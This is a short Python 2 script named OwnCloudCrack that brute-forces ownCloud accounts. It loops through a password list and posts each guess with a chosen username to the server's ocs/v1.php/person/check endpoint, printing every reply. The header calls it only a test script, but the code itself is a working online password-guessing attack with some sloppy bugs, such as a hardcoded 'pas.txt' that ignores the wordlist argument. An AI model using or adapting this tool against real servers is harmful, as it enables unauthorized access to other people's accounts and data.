#!/usr/bin/python
# OwnCloudCrack - a clone of ocrk.sh in python
# Copyright (C) 2016 51x
#
# This script is only a test script. Don't rely on it for bruteforcing!
#
# requests module does not look much faster comparted to wget. maybe with some tweaks...

import sys  # For argument parsing
import requests  # For the HTTP(S) requests

if len(sys.argv) < 4 :
    print '''
    OwnCloud Crack help
    Syntax: ./ocrk.sh <site url> <username> <passwordlist>
    Example: ./orck.sh https://www.crkoc.com/ admin rockyou.txt
    '''
    sys.exit()
    pass

host = sys.argv[1]
user = sys.argv[2]
pwl = sys.argv[3]

hosturl = host + 'ocs/v1.php/person/check'

print host + user + pwl

f = open("pas.txt","r")

for linep in f:
    r = requests.post(hosturl, data = {'login':user,'password':linep})
    print r.text
    r.close

f.close
